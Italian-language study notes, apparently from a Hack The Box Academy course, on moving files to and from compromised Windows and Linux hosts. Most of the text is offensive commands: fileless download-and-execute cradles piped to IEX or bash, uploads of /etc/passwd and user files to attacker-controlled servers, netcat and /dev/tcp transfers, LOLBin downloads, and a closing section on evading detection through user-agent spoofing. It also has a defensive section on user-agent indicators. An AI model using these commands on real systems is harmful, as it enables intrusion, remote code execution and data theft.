# Table of contents
- [Windows file transfer methods](#windows-file-transfer-methods)
  - [Introduction](#introduction)
  - [PowerShell base64 encode & decode](#powershell-base64-encode--decode)
  - [Powershell web downloads](#powershell-web-downloads)
    - [File download](#file-download)
    - [PowerShell DownloadString - Fileless Method](#powershell-downloadstring---fileless-method)
    - [PowerShell Invoke-WebRequest](#powershell-invoke-webrequest)
    - [Common Errors with PowerShell](#common-errors-with-powershell)
  - [SMB downloads](#smb-downloads)
    - [Create the SMB Server](#create-the-smb-server)
    - [Copy a file from the smb server](#copy-a-file-from-the-smb-server)
    - [Create the SMB Server with a Username and Password](#create-the-smb-server-with-a-username-and-password)
    - [Mount the SMB Server with Username and Password](#mount-the-smb-server-with-username-and-password)
  - [FTP downloads](#ftp-downloads)
    - [Installing the FTP Server Python3 Module - pyftpdlib](#installing-the-ftp-server-python3-module---pyftpdlib)
    - [Setting up a Python3 FTP Server](#setting-up-a-python3-ftp-server)
    - [Transferring Files from an FTP Server Using PowerShell](#transferring-files-from-an-ftp-server-using-powershell)
    - [Create a Command File for the FTP Client and Download the Target File](#create-a-command-file-for-the-ftp-client-and-download-the-target-file)
  - [Upload Operations](#upload-operations)
    - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode-1)
    - [PowerShell Web Uploads](#powershell-web-uploads)
      - [Installing a Configured WebServer with Upload](#installing-a-configured-webserver-with-upload)
      - [PowerShell Script to Upload a File to Python Upload Server](#powershell-script-to-upload-a-file-to-python-upload-server)
      - [Powershell base64 web upload](#powershell-base64-web-upload)
    - [SMB Uploads](#smb-uploads)
      - [Configure webdav server](#configure-webdav-server)
      - [Using the WebDav Python module](#using-the-webdav-python-module)
      - [Connecting to the Webdav Share](#connecting-to-the-webdav-share)
      - [Uploading Files using SMB](#uploading-files-using-smb)
    - [FTP uploads](#ftp-uploads)
      - [PowerShell Upload File](#powershell-upload-file)
      - [Create a Command File for the FTP Client to Upload a File](#create-a-command-file-for-the-ftp-client-to-upload-a-file)
- [Transferring files with code](#transferring-files-with-code)
- [Miscellaneous file transfer methods](#miscellaneous-file-transfer-methods)
  - [Netcat (nc)](#netcat-nc)
  - [PowerShell Session File Transfer](#powershell-session-file-transfer)
  - [RDP](#rdp)
    - [Mounting a Linux Folder Using rdesktop](#mounting-a-linux-folder-using-rdesktop)
    - [Mounting a Linux Folder Using xfreerdp](#mounting-a-linux-folder-using-xfreerdp)
- [Protected file transfer](#protected-file-transfer)
  - [File encryption on windows](#file-encryption-on-windows)
  - [File encryption on linux](#file-encryption-on-linux)
- [Catching Files over HTTP/S](#catching-files-over-https)
  - [Nginx - Enabling PUT](#nginx---enabling-put)
    - [Create a Directory to Handle Uploaded Files](#create-a-directory-to-handle-uploaded-files)
    - [Change the Owner to www-data](#change-the-owner-to-www-data)
    - [Create Nginx Configuration File](#create-nginx-configuration-file)
    - [Symlink our Site to the sites-enabled Directory](#symlink-our-site-to-the-sites-enabled-directory)
    - [Start Nginx](#start-nginx)
    - [Verifying Errors](#verifying-errors)
    - [Remove NginxDefault Configuration](#remove-nginxdefault-configuration)
    - [Upload File Using cURL](#upload-file-using-curl)
- [Living off The Land](#living-off-the-land)
  - [GTFOBins](#gtfobins)
    - [Create Certificate in our Pwnbox](#create-certificate-in-our-pwnbox)
    - [Stand up the Server in our Pwnbox](#stand-up-the-server-in-our-pwnbox)
    - [Download File from the Compromised Machine](#download-file-from-the-compromised-machine)
  - [Other Common Living off the Land tools](#other-common-living-off-the-land-tools)
- [Detection](#detection)
  - [Invoke-WebRequest - Client](#invoke-webrequest---client)
  - [Invoke-WebRequest - Server:](#invoke-webrequest---server)
  - [WinHttpRequest - Client](#winhttprequest---client)
  - [WinHttpRequest - Server](#winhttprequest---server)
  - [Certutil - Client](#certutil---client)
  - [Certutil - Server](#certutil---server)
  - [BITS - Client](#bits---client)
  - [BITS - Server](#bits---server)
  - [Msxml2 - Server](#msxml2---server)
- [Evading detection](#evading-detection)


# Windows file transfer methods
## Introduction
Microsoft astaroth attack blog post an example of and advanced persistent threat (APT).
Le minacce "fileless" non implicano l'assenza totale di un trasferimento file, ma indicano che i payload non risiedono in modo permanente sul disco, venendo invece eseguiti direttamente in memoria.

L'attacco abusa di strumenti legittimi già presenti nel sistema operativo Windows (tecnica nota come Living off the Land o LOLBins).

Sequenza Fase per Fase dell'Attacco Astaroth:
- Vettore di Accesso Iniziale (Spear-Phishing):
L'attacco prende il via con un link malevolo all'interno di un'email di spear-phishing che porta al download di un file scorciatoia con estensione .LNK.

- Esecuzione Iniziale via WMIC:
Al doppio clic dell'utente sul file .LNK, viene richiamato lo strumento nativo WMIC (wmic.exe).
Tramite il parametro /Format, WMIC scarica ed esegue un codice JavaScript malevolo.

- Download dei Payload tramite Bitsadmin:
Il codice JavaScript abusato invoca lo strumento di sistema Bitsadmin (bitsadmin.exe) per scaricare sul sistema i payload successivi.

- Offuscamento e Decodifica con Certutil:
Tutti i payload scaricati sono inizialmente codificati in Base64.
Viene utilizzato lo strumento nativo Certutil (certutil.exe) per decodificare i file in formato Base64, ottenendo alcune librerie DLL.

- Caricamento DLL con Regsvr32:
Viene eseguito lo strumento Regsvr32 (regsvr32.exe) per caricare una delle DLL decodificate.

- Iniezione Finale del Malware:
La DLL caricata provvede a decifrare e caricare ulteriori file intermedi, fino ad eseguire l'iniezione del payload finale di Astaroth direttamente
![img](https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)

## PowerShell base64 encode & decode
Quando non è disponibile una connessione di rete diretta ma si possiede un accesso terminale, è possibile trasferire file convertendoli in stringhe Base64:

1. Si codifica il file nel sistema di origine.

2. Si copia la stringa nel terminale di destinazione.

3. Si decodifica la stringa per ricreare il file originale.

4. Si verifica l'integrità del file tramite l'hash MD5.

Passaggi Operativi:

1. Verifica e Codifica (Linux / Pwnbox)
Calcolo MD5 originario:

comando: md5sum id_rsa

Output di esempio: 4e301756a07ded0a2dd6953abf015278  id_rsa

2. Conversione in Base64 (linea singola senza a capo): 

comando: cat id_rsa | base64 -w 0; echo

3. Decodifica (usando funzione PowerShell)
Scrittura e decodifica diretta del file:

comando: \[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", \[Convert]::FromBase64String("<STRINGA_BASE64>"))

4. Verifica Integrità (Windows PowerShell)
Confronto dell'hash MD5:

comando: Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

(Verificare che l'hash restituito corrisponda perfettamente a quello generato su Linux).

Limitazioni da considerare
CMD.exe: Ha un limite massimo di 8191 caratteri per stringa.

Web Shell: Possono restituire errori se si inviano stringhe Base64 troppo grandi.

## Powershell web downloads

- OpenRead:	Returns the data from a resource as a Stream.
- OpenReadAsync:	Returns the data from a resource without blocking the calling thread.
- DownloadData:	Downloads data from a resource and returns a Byte array.
- DownloadDataAsync:	Downloads data from a resource and returns a Byte array without blocking the calling thread.
- DownloadFile:	Downloads data from a resource to a local file.
- DownloadFileAsync:	Downloads data from a resource to a local file without blocking the calling thread.
- DownloadString:	Downloads a String from a resource and returns a String.
- DownloadStringAsync:	Downloads a String from a resource without blocking the calling thread.

### File download
- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('\<Target File URL>','\<Output File Name>')
- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('\<Target File URL>','\<Output File Name>')

### PowerShell DownloadString - Fileless Method
Gli attacchi fileless sfruttano funzionalità native del sistema operativo per scaricare ed eseguire il payload direttamente in memoria, senza mai salvarlo sul disco rigido. Questo riduce la traccia lasciata sul sistema e rende l'individuazione più difficile per molti antivirus.

In PowerShell, questo meccanismo si implementa principalmente tramite il cmdlet Invoke-Expression (o il suo alias IEX).

Punti Chiave del Trasferimento Fileless,
Download in Memoria:

Utilizzando .DownloadString(), PowerShell scarica il codice dello script sotto forma di stringa senza creare un file temporaneo su disco.

Esecuzione Immediata:

Inoltrando la stringa a IEX, il contenuto scaricato viene interpretato ed eseguito istantaneamente nello spazio di memoria del processo PowerShell corrente. IEX esegue una stringa specifica e ritorna il risultato del comando o dell'espressione.

Sintassi di Esempio
1. Chiamata Diretta:
IEX (New-Object Net.WebClient).DownloadString('https://<URL_PAYLOAD>/script.ps1')
2. IEX accetta pipelone in input: 
(New-Object Net.WebClient).DownloadString('https://<URL_PAYLOAD>/script.ps1') | IEX


### PowerShell Invoke-WebRequest
Invoke-WebRequest cmdlet da Powershell 3.0, si può usare come alias curl,wget, iwr.
- PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

- [cradels](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)


### Common Errors with PowerShell
Può essere che la configurazione di explorer non sia completa, il che impedisce il download.
Questo puo essere bypassato tramite il parametro -UseBasicParsing
- PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

Un altro errore nei downloads Powershell riguarda ssl/tls se il certificato non è fidato, si bypassa con il comando:  PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

## SMB downloads

Il protocollo SMB (porte TCP/445) è ampiamente diffuso nelle reti enterprise Windows. Permette di trasferire file da/verso server remoti creando una condivisione locale sull'attaccante e usandola direttamente dalla macchina Windows target tramite comandi standard come copy, move o Copy-Item.

### Create the SMB Server
sudo impacket-smbserver <NOME_SHARE> -smb2support <PERCORSO_LOCALE>

Esempio: sudo impacket-smbserver share -smb2support /tmp/smbshare

### Copy a file from the smb server
C:\htb> copy \\192.168.220.133\share\nc.exe

Nuove versioni di windows bloccano accessi non autenticati degli utenti

### Create the SMB Server with a Username and Password
crirom00@htb[/htb]$ sudo impacket-smbserver <NOME_SHARE> -smb2support <PERCORSO_LOCALE> -user <USER> -password <PASS>

Esempio: sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

### Mount the SMB Server with Username and Password
C:\htb> net use n: \\192.168.220.133\share /user:test test

C:\htb> copy n:\nc.exe

Download del File (Target / Windows)Copia diretta da condivisione anonima:DOScopy \\<IP_ATTACCANTE>\<NOME_SHARE>\file.exe
Montaggio della condivisione con credenziali (se l'accesso guest è bloccato):DOSnet use n: \\<IP_ATTACCANTE>\<NOME_SHARE> /user:<USER> <PASS>

## FTP downloads
Trasferimento fils con ftp sulla porta tcp/21 e tcp/20. Si usa Net.WebClient per scaricare files dal server ftp. Configurazione server ftp per attacco con modulo pyftplib.

### Installing the FTP Server Python3 Module - pyftpdlib
crirom00@htb[/htb]$ sudo pip3 install pyftpdlib

### Setting up a Python3 FTP Server
crirom00@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

Di default pyftplib usa port 2121, autenticaizone anonima è abilitata se username e password non sono specificati. Dopo setup del server ftp, possiamo trasferire file con il client ftp pre installato in windows oppure con Net.WebClient.

### Transferring Files from an FTP Server Using PowerShell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

Quando otteniamo una shell su una macchina remota, potremmo non avere una shell interattiva. In tal caso, possiamo creare un file di comandi FTP per scaricare un file.

### Create a Command File for the FTP Client and Download the Target File
- C:\htb> echo open 192.168.49.128 > ftpcommand.txt
- C:\htb> echo USER anonymous >> ftpcommand.txt
- C:\htb> echo binary >> ftpcommand.txt
- C:\htb> echo GET file.txt >> ftpcommand.txt
- C:\htb> echo bye >> ftpcommand.txt
- C:\htb> ftp -v -n -s:ftpcommand.txt
- ftp> open 192.168.49.128
Log in with USER and PASS first.
- ftp> USER anonymous
- ftp> GET file.txt
- ftp> bye
- C:\htb>more file.txt

## Upload Operations
Invio dati dal target all'attaccante.
Diversi modi per caricare file:

### PowerShell Base64 Encode & Decode
Encode a file using powershell:

- PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) -> ritorna \<stringabase64>

- PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash -> ritorna hash del contenuto del file hosts

Decode base64 string in linux:
- crirom00@htb[/htb]$ echo \<stringabase64> | base64 -d > hosts
- crirom00@htb[/htb]$ md5sum hosts -> ritorna 3688374325b992def12793500307566d  hosts

## PowerShell Web Uploads
Powershell non ha funzioni built in per fare upload, ma possiamo usare Invoke-WebRequest or Invoke-RestMethod to build our upload function. Serve anche un server che accetti gli uploads, cosa che non è di default nei comuni webserver.
#### Installing a Configured WebServer with Upload
- crirom00@htb[/htb]$ pip3 install uploadserver
- crirom00@htb[/htb]$ python3 -m uploadserver
#### PowerShell Script to Upload a File to Python Upload Server
- PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
- PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373

### Powershell base64 web upload
Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

- PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
- PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

Con Netcat sulla stessa porta catturiamo i dati in base64, e poi decodifichiamo la stringa in base64.

crirom00@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts


## SMB Uploads
Aziende permettono traffico in uscita http(80), https(443), ma bloccano SMB protocol (445), al di fuori della rete interna.
([Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)).
Un'alternativa è eseguire smb su http/https con WebDAV. Il protocollo WebDAV consente a un server web di comportarsi come un server di file, supportando la creazione collaborativa di contenuti.

### Configure webdav server
To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot (you can read more about this implementation here: wsgidav github).

### Using the WebDav Python module
crirom00@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

### Connecting to the Webdav Share
Now we can attempt to connect to the share using the DavWWWRoot directory.

C:\htb> dir \\192.168.49.128\DavWWWRoot

### Uploading Files using SMB
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\\192.168.49.129\sharefolder\

## FTP uploads
Specifichiamo --write per permettere ai client di inviare files verso la macchina attaccante.

crirom00@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

### PowerShell Upload File
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

### Create a Command File for the FTP Client to Upload a File
- C:\htb> echo open 192.168.49.128 > ftpcommand.txt
- C:\htb> echo USER anonymous >> ftpcommand.txt
- C:\htb> echo binary >> ftpcommand.txt
- C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
- C:\htb> echo bye >> ftpcommand.txt
- C:\htb> ftp -v -n -s:ftpcommand.txt
- ftp> open 192.168.49.128 -> Log in with USER and PASS first.

- ftp> USER anonymous
- ftp> PUT c:\windows\system32\drivers\etc\hosts
- ftp> bye

# Transferring files with code
Il testo spiega come trasferire file usando linguaggi di programmazione, sfruttando interpreti già presenti sulla macchina target quando strumenti come wget o curl non sono disponibili.

1. Python

Python permette di eseguire dal terminale in una singola riga con -c.

Download con Python 3:

python3 -c 'import urllib.request;urllib.request.urlretrieve("URL","file")'


urllib.request → gestisce la richiesta HTTP;
urlretrieve() → scarica il contenuto dell'URL e lo salva nel file indicato.

2. PHP

PHP offre diversi modi per scaricare file.

Con file_get_contents() + file_put_contents():

php -r '$file=file_get_contents("URL"); file_put_contents("file",$file);'
file_get_contents() legge il contenuto remoto;
file_put_contents() lo salva localmente.

Un'alternativa è usare:

fopen() → fread() → fwrite() → fclose()

che permette di leggere il file remoto a blocchi (buffer) e scriverlo progressivamente.

Fileless execution

Il contenuto può anche essere mandato direttamente a bash:

php -r '...' | bash

3. Ruby e Perl

Anche Ruby e Perl possono essere utilizzati per trasferire file e supportano l'esecuzione di one-liner:

ruby -e '...'
perl -e '...'

Ruby può usare Net::HTTP, mentre Perl può usare LWP::Simple.

4. JavaScript su Windows

Su Windows è possibile utilizzare JavaScript tramite:

cscript.exe

Lo script usa:

WinHttp.WinHttpRequest.5.1 → effettua la richiesta HTTP;
ADODB.Stream → gestisce i dati binari;
SaveToFile() → salva il risultato sul disco.

Esempio:

cscript.exe /nologo wget.js URL file

Gli argomenti vengono recuperati tramite:

WScript.Arguments

5. Upload con Python 3

Il testo mostra infine il procedimento inverso: inviare un file dalla macchina target verso un server controllato.

Prima si avvia un server di upload:

python3 -m uploadserver

che espone /upload sulla porta 8000.

Poi Python requests effettua una richiesta HTTP POST:

requests.post(
    url,
    files={"files": open("/etc/passwd", "rb")}
)

# Miscellaneous file transfer methods

## Netcat (nc)
Netcat (nc) o Ncat per trasferire file tramite connessioni TCP/UDP, per leggere e scrivere verso una connessione tcp o udp.
1. Modalità Inbound (Il bersaglio ascolta)
Utilizzabile se il firewall del bersaglio permette connessioni in ingresso.

- Sul Bersaglio (In ascolto):

    - nc -l -p 8000 > SharpKatz.exe
    - ncat -l -p 8000 --recv-only > SharpKatz.exe

- Sull'Attaccante (Invio file):

    - nc -q 0 <IP_TARGET> 8000 < SharpKatz.exe
    - ncat --send-only <IP_TARGET> 8000 < SharpKatz.exe

2. Modalità Outbound (L'attaccante ascolta)

- Sull'Attaccante (In ascolto con il file pronto):

    - sudo nc -l -p 443 -q 0 < SharpKatz.exe
    - sudo ncat -l -p 443 --send-only < SharpKatz.exe

- Sul Bersaglio (Connessione e ricezione):

    - nc <IP_ATTACCANTE> 443 > SharpKatz.exe
    - ncat <IP_ATTACCANTE> 443 --recv-only > SharpKatz.exe

3. Trasferimento senza Netcat/Ncat (Pseudo-device Bash /dev/tcp)
Se la macchina bersaglio Linux non ha nc o ncat installati, è possibile usare la funzionalità nativa di Bash /dev/tcp.

- Sull'Attaccante (In ascolto su una porta consentita, es. 443):
    - sudo ncat -l -p 443 --send-only < SharpKatz.exe

- Sul Bersaglio (Download nativo con Bash):
    - cat < /dev/tcp/<IP_ATTACCANTE>/443 > SharpKatz.exe

Flag Fondamentali da Ricordare:
- -q 0 (Netcat): Chiude la connessione non appena l'input (EOF) è stato completamente trasmesso.

- --send-only (Ncat): Termina l'esecuzione non appena il file è stato inviato.

- --recv-only (Ncat): Termina la sessione una volta completata la ricezione, evitando che il processo rimanga appeso.

## PowerShell Session File Transfer

Se HTTP/HTTPS/SMB non sono disponibili, è possibile usare PowerShell Remoting (WinRM) per trasferire file tra computer Windows.
PowerShell Remoting permette di eseguire comandi/script su un computer remoto tramite una sessione PowerShell.

WinRM usa normalmente:
TCP 5985 → HTTP,TCP 5986 → HTTPS.
Per creare una sessione remota servono privilegi amministrativi, appartenenza a Remote Management Users oppure permessi espliciti.

Procedura:

1. Verificare che WinRM sia raggiungibile:

- Test-NetConnection -ComputerName DATABASE01 -Port 5985

    - Se TcpTestSucceeded : True allora la connessione alla porta WinRM è disponibile.

2. Creare una sessione PowerShell remota:

- $Session = New-PSSession -ComputerName DATABASE01

La sessione viene salvata nella variabile $Session.

3. Trasferire un file da DC01 a DATABASE01:

- Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

    - La parte importante è -ToSession: indica che il file deve essere copiato nella macchina remota.

4. Trasferire un file da DATABASE01 a DC01:

- Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session

    - -Qui -FromSession indica che il file viene prelevato dalla macchina remota e copiato sulla macchina locale.

Da ricordare
DC01 ── -ToSession ──> DATABASE01,
DC01 <── -FromSession ─ DATABASE01

## RDP
Remote desktop protocol usato in reti windows per accesso remoto. Si trasferiscono files con rdp facendo copia e incolla.

Se ci si connette da Linux si può usare xfreerdp o rdesktop, che abilitano la copia dal target alla sessione rdp.

In alternativa, possiamo montare una risorsa locale sul server rdp del target, xfreerdp o rdesktop possono esporre un folder locale nella sessione remota rdp.

### Mounting a Linux Folder Using rdesktop
crirom00@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u username -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

### Mounting a Linux Folder Using xfreerdp
crirom00@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:username /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer


# Protected file transfer
Essenziale cifrare i dati prima di trasferirli oppure usare conneessione cifrata come ssh, https, sftp,etc, per evitare data leakage. A volte queste opzioni non sono fattibili e bisogna usare approcci diversi.

## File encryption on windows
Metodo per cifrare file e stringhe su windows tramite [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) powershell script.

PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1

PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

## File encryption on linux
Per cifrare un file si usa openssl, fornisce molti cifrari.

- crirom00@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
    - -aes256:tipo di cifrario, -iter 100000: override default iterazione, -pbkdf2: use pass-based key derivation function 2 algorithm.
- crirom00@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd: per decifrare

Si consigli di usare un metodo di trasporto sicuro come sftp, ssh, https, etc.

# Catching Files over HTTP/S
http/s protocolli piu comuni per trasferire files e i piu aperti ai firewall.
In seguito vediamo come creare un secure web server per operazioni di upload.

## Nginx - Enabling PUT
Buona alternativa rispetto a Apache, non complessa la configurazione. Quando si permettono http uploads, è critico essere sicuri che un utente non possa eseguire o caricare webshell. Con Apache, la presenza di moduli PHP può portare all'esecuzione automatica di web shell caricate. Nginx gestisce PHP tramite servizi separati (es. php-fpm), quindi l'abilitazione del caricamento di file non attiva automaticamente l'esecuzione di script. Se si accede all'URL senza specificare un file, Nginx non elenca i file presenti nella cartella (a differenza di Apache), mantenendo riservati i file esfiltrati.

### Create a Directory to Handle Uploaded Files
crirom00@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory

### Change the Owner to www-data
crirom00@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

### Create Nginx Configuration File
Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents: 

server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}

### Symlink our Site to the sites-enabled Directory
crirom00@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

### Start Nginx
crirom00@htb[/htb]$ sudo systemctl restart nginx.service

### Verifying Errors
crirom00@htb[/htb]$ tail -2 /var/log/nginx/error.log

crirom00@htb[/htb]$ ss -lnpt | grep 80

crirom00@htb[/htb]$ ps -ef | grep 2811

### Remove NginxDefault Configuration
crirom00@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default

### Upload File Using cURL
crirom00@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt -> upload the specific file with curl -T

# Living off The Land
Non essere persistenti sul disco, eseguire in memoria e non salvare nulla.
Ci sono due siti che aggregano info su living off the land binaries(lolbas): [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
[GTFOBins for Linux Binaries](https://gtfobins.github.io/).

Living off the Land binaries can be used to perform functions such as:
- download
- upload
- command execution
- file read
- file write
- bypasses

Per cercare programmi per download/upload:
- LOLBAS: /download o /upload sulla barra di ricerca
- GTFOBins: +file download o +file upload sulla barra di ricerca

## GTFOBins
### Create Certificate in our Pwnbox
crirom00@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

### Stand up the Server in our Pwnbox
crirom00@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

### Download File from the Compromised Machine
crirom00@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh

## Other Common Living off the Land tools
- [Bitsadmin] (https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) per download files from http sites and smb shares.
    - Download: PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

- Certutil: download arbitrary files (simil a wget).
    - C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

# Detection
1. Command-Line Detection based on blacklisting: Bloccare o rilevare comandi specifici (es. certutil, powershell IEX) è facile da aggirare per gli attaccanti, ad esempio cambiando maiuscole/minuscole o usando cifrature e variabili. Whitelisting: Creare una lista di tutti i comandi legittimi e autorizzati in una rete aziendale richiede tempo iniziale, ma è un metodo molto efficace, qualsiasi comando non presente nella lista genera immediatamente un allarme.

2. Rilevamento tramite User-Agent e Header HTTP: Quando un utente o uno strumento effettua una richiesta HTTP a un server web, invia un'intestazione chiamata User-Agent che identifica l'applicazione utilizzata (es. Chrome, Firefox, cURL, Python o strumenti di attacco come sqlmap e nmap).Gli analisti di sicurezza integrano nei SIEM elenchi di User-Agent legittimi (processi del SO, aggiornamenti di Windows Update o dell'antivirus). In questo modo, traffico insolito o User-Agent non standard vengono evidenziati come anomalie sospette.


3. User-Agent/header per Windows:  quali User-Agent vengono inviati ai log del server web quando un attaccante esegue comandi di trasferimento file su Windows:
### Invoke-WebRequest - Client 
- PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
- PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"

### Invoke-WebRequest - Server:
- GET /nc.exe HTTP/1.1
- User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) 
- WindowsPowerShell/5.1.14393.0

### WinHttpRequest - Client
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText

### WinHttpRequest - Server
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)

### Certutil - Client
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe

### Certutil - Server
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0

### BITS - Client
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r

### BITS - Server
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8

### Msxml2 - Server
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)

Per i Difensori (Blue Team): Se nei log del web server o del firewall aziendale compare una richiesta diretta verso Internet da Microsoft-CryptoAPI/10.0 o Microsoft BITS/7.8 diretta a un IP non Microsoft per scaricare un file eseguibile (.exe), si tratta di un indicatore di compromissione (IoC) quasi certo.

Per gli Attaccanti (Red Team): L'utilizzo delle impostazioni predefinite di questi strumenti lascia impronte digitali nei log. Gli attaccanti più avanzati modificano l'User-Agent predefinito nei propri script (es. impostando uno User-Agent identico a quello di Google Chrome) per mimetizzarsi nel traffico web legittimo.

# Evading detection

1. Modifica dello User-Agent in PowerShell
I difensori monitorano i log di rete per individuare User-Agent predefiniti di PowerShell o di utility di sistema (es. WindowsPowerShell/...). Con Invoke-WebRequest, è possibile sovrascrivere lo User-Agent mimetizzandosi tra i browser legittimi aziendali (come Chrome, Firefox, Safari).

Elenco degli User-Agent predefiniti in PowerShell:
- [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";
 Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}}

Esecuzione del Download con User-Agent Chrome:

- $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
- Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"

Risultato nei log del server web: La richiesta appare inviata da un browser Chrome standard (Mozilla/5.0... Chrome/7.0...), riducendo il rischio di segnalazioni immediate nel SIEM.

2. Uso di LOLBAS e GTFOBins
Quando le politiche di Application Whitelisting (es. AppLocker) bloccano PowerShell o Netcat, oppure il logging da riga di comando è particolarmente restrittivo, gli attaccanti usano i LOLBINs (Living Off The Land Binaries). 

Esempio (Windows): GfxDownloadWrapper.exe (driver grafico Intel):
